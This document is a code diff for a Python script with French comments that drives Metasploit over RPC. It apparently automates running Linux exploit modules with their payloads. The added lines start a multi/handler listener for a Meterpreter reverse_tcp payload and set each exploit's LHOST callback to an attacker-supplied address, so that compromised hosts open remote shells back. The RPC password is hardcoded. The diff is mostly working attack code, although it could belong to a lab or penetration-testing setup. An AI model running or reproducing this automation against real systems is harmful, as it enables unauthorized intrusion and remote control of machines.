@@ -19,6 +19,9 @@ PG_HOST = "postgres"
 
 MODE_RUN = 1
 
+LHOST = os.getenv("LHOST", "")
+LPORT = int(os.getenv("LPORT", "4444"))
+
 
 def read_secret(name: str) -> str | None:
     p = Path(f"/run/secrets/{name}")
@@ -142,8 +145,26 @@ def main():
 #        return
 
     client = MsfRpcClient('totototo', port=55553, server="127.0.0.1", ssl=True)
+
+    # Démarrer le listener multi/handler en tâche de fond
+    if LHOST:
+        console_h = client.consoles.console()
+        for cmd in [
+            "use exploit/multi/handler",
+            "set PAYLOAD linux/x64/meterpreter/reverse_tcp",
+            f"set LHOST {LHOST}",
+            f"set LPORT {LPORT}",
+            "set ExitOnSession false",
+            "exploit -j -z",
+        ]:
+            console_h.write(cmd + "\n")
+            time.sleep(1)
+        print(f"[INFO] Listener multi/handler démarré sur {LHOST}:{LPORT}")
+    else:
+        print("[WARN] LHOST non défini, listener non démarré")
+
     search_results = client.modules.search('linux')
-    while True: 
+    while True:
 
      console_id = client.consoles.console().cid
      console = client.consoles.console(console_id)
@@ -191,7 +212,7 @@ def main():
                     else:
                         print(f"[SKIP] SESSION requise mais aucune session active")
                case "LHOST":
-                    exploit[missing[index1]] = "1.1.1.1"
+                    exploit[missing[index1]] = LHOST
                case _:
                     print (f"Pas traite {missing[index1]}")
         if exploit.missing_required:
@@ -203,18 +224,6 @@ def main():
 #        print (f" payload {payload}")
         if (len (payload) > 0):
           if ( MODE_RUN == 1 ):
-            for index1 in range(0, len(payload)):
-              print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
-              try:
-                  console.run_module_with_output(exploit, payload[index1])
-                  print (": Ok")
-              except:
-                  print (": A controler")
-                  continue
-              while console.is_busy():
-                   print("+",end="")
-                   time.sleep(1)
-          else:
             for index1 in range(0, len(payload)):
               print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
               try:
